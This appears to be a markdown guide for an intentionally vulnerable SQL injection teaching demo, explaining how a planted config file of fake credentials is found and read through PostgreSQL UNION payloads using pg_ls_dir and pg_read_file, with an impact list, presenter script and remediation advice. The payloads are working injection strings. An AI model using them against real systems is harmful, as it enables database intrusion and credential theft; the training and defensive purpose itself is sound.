# 🎯 Real-World Scenario: Database Configuration File Exposure

## 📁 New Feature: Realistic Config File

I've added a **`dbconf.ini`** file to make the demo more realistic. This simulates a common real-world mistake where developers store sensitive credentials in config files.

---

## 🔥 The Attack Scenario

### Step 1: Discover the Config File

**List application directory:**
```sql
?id=1 UNION SELECT 1, 2, pg_ls_dir('/app'), 0.00, 'Application files', 'dir', CURRENT_TIMESTAMP
```

**Result**: You'll see files including:
- app.py
- dbconf.ini ⭐ **TARGET**
- requirements.txt
- templates/
- static/

### Step 2: Read the Config File

**Extract credentials:**
```sql
?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/tmp/dbconf.ini'), 'credentials', CURRENT_TIMESTAMP
```

### Step 3: What You Get 💰

The **dbconf.ini** file contains:

#### 🗄️ Database Credentials
- **Production DB**: `typo_admin` / `insecure_password_123`
- **Backup DB**: `backup_user` / `Backup_P@ssw0rd_2024!`
- **Redis**: Password included

#### 🔑 API Keys & Secrets
- **Stripe** (payment processing):
  - Secret key: `sk_test_51J8kN9K2x3P4q5R6s7T8u9V0w1X2y3Z`
  - Public key: `pk_test_51J8kN9K2x3P4q5R6s7T8u9V0w1X2y3Z`
- **SendGrid** (email): `SG.abc123def456ghi789jkl012mno345pqr`
- **AWS**:
  - Access Key: `AKIAIOSFODNN7EXAMPLE`
  - Secret Key: `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY`

#### 🛡️ Security Tokens
- Flask secret key
- JWT secret token
- AES encryption key
- Webhook secrets

#### 📊 Monitoring Services
- DataDog API key
- Sentry DSN
- New Relic license key
- Slack webhook URL

---

## 💥 Business Impact

With this information, an attacker can:

1. ✅ **Access Production Database**
   - Connect directly using extracted credentials
   - Dump all data
   - Modify records
   - Drop tables

2. ✅ **Access Backup Database**
   - Historical data exfiltration
   - Complete data recovery for analysis

3. ✅ **Charge Payments via Stripe**
   - Process fraudulent transactions
   - Steal customer payment info
   - Issue refunds to attacker's accounts

4. ✅ **Use AWS Account**
   - Spin up EC2 instances (crypto mining)
   - Access S3 buckets
   - Rack up thousands in bills

5. ✅ **Send Phishing Emails via SendGrid**
   - Use company's email reputation
   - Send 100,000+ phishing emails
   - Damage brand reputation

6. ✅ **Access Monitoring Data**
   - See all system metrics
   - Understand infrastructure
   - Plan further attacks
   - Delete audit logs

---

## 🎓 Educational Value

This demonstrates:

### Real-World Mistake
Many developers store credentials in config files thinking:
- "It's inside the Docker container, so it's safe"
- "Only our team has access to the server"
- **WRONG!** SQL injection can read these files!

### Attack Chain
```
SQL Injection → Directory Listing → Config File Reading → Credential Theft → System Compromise
```

### Defense Layers That Failed
1. ❌ **Application Security**: SQL injection vulnerability
2. ❌ **File Permissions**: Config readable by application user
3. ❌ **Secrets Management**: Plaintext credentials in files
4. ❌ **Database Security**: Excessive privileges (pg_read_file)

---

## 🛡️ Proper Security Approach

### ❌ BAD (Current Demo)
```ini
# dbconf.ini
[database]
password = insecure_password_123
```

### ✅ GOOD (Production)
```python
# Use environment variables
import os
db_password = os.environ.get('DB_PASSWORD')

# Or use secrets manager
from aws_secretsmanager import get_secret
db_password = get_secret('prod/db/password')

# Or use encrypted vault
from vault import get_credential
db_password = get_credential('database', 'password')
```

### Additional Protections
1. ✅ **Parameterized Queries** (prevents SQL injection)
2. ✅ **Secrets Manager** (AWS Secrets Manager, HashiCorp Vault)
3. ✅ **Environment Variables** (never commit to git)
4. ✅ **Least Privilege** (DB user can't read files)
5. ✅ **File Permissions** (config files 600/400 permissions)
6. ✅ **Encryption at Rest** (encrypt sensitive files)
7. ✅ **Key Rotation** (change credentials regularly)
8. ✅ **Audit Logging** (detect file access attempts)

---

## 🎬 Demo Script

### Scenario: "The Crown Jewels"

**Setup** (30 seconds):
- "This application has SQL injection"
- "But the real damage comes from what we can READ"

**Demo Part 1** (60 seconds): Discovery
```
Try: ?id=1 UNION SELECT 1, 2, pg_ls_dir('/app'), 0.00, 'files', 'dir', CURRENT_TIMESTAMP
Show: "Look! There's a dbconf.ini file"
Explain: "Config files are HIGH VALUE targets"
```

**Demo Part 2** (90 seconds): Exploitation
```
Try: ?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/tmp/dbconf.ini'), 'creds', CURRENT_TIMESTAMP
Show: Full config file with all credentials
Explain: "We just got:"
  - Database passwords
  - API keys worth $$$
  - AWS access (unlimited EC2 instances!)
  - Payment processing keys
  - Monitoring access
```

**Demo Part 3** (60 seconds): Impact
```
Explain business impact:
- "With Stripe keys, attacker can process payments"
- "With AWS keys, attacker can mine cryptocurrency on your bill"
- "With SendGrid key, attacker can send phishing emails as your company"
- "With DB credentials, attacker can dump ALL customer data"
- "Total potential damage: $100,000+ in one hour"
```

**Demo Part 4** (30 seconds): The Fix
```
Show proper approach:
- Use environment variables
- Use secrets manager
- Parameterized queries (prevents SQL injection in first place)
- Least privilege (DB user shouldn't read files)
```

---

## 📊 Compliance Impact

This type of breach violates:

- **PCI DSS** (storing payment credentials insecurely)
- **GDPR** (inadequate technical measures)
- **SOC 2** (access controls failure)
- **HIPAA** (if health data present)
- **ISO 27001** (information security standards)

**Potential fines**: Millions of dollars + mandatory breach notification

---

## 🎯 Testing the Feature

**Quick test payload:**
```sql
?id=1 UNION SELECT 1, 2, 'CONFIG FILE', 0.00, pg_read_file('/tmp/dbconf.ini'), 'JACKPOT', CURRENT_TIMESTAMP
```

**Expected result**: Full config file contents displayed in the "description" column

---

## 📖 Related Documentation

- **QUICK_REFERENCE.md** - Updated with dbconf.ini as #1 target
- **POSTGRES_SQLI_PAYLOADS.md** - Full payload list including config file
- **TYPE_MATCHING_GUIDE.md** - Type matching for UNION queries

---

## 🎉 Why This Makes the Demo Better

### Before
- Demo showed file reading
- But reading `/etc/passwd` doesn't show REAL business impact
- Felt academic

### After ⭐
- **REALISTIC** scenario (developers DO this!)
- **CLEAR business impact** ($$$$ in stolen credentials)
- **RELATABLE** (everyone uses APIs)
- **DRAMATIC** (show actual API keys, passwords)
- **MEMORABLE** (students will remember "the config file attack")

This turns a technical demo into a **business case study**! 🚀

---

**Updated**: November 2025  
**File**: `/tmp/dbconf.ini`  
**Payload**: `pg_read_file('/tmp/dbconf.ini')`  
**Impact**: 💰💰💰 HIGH VALUE TARGET
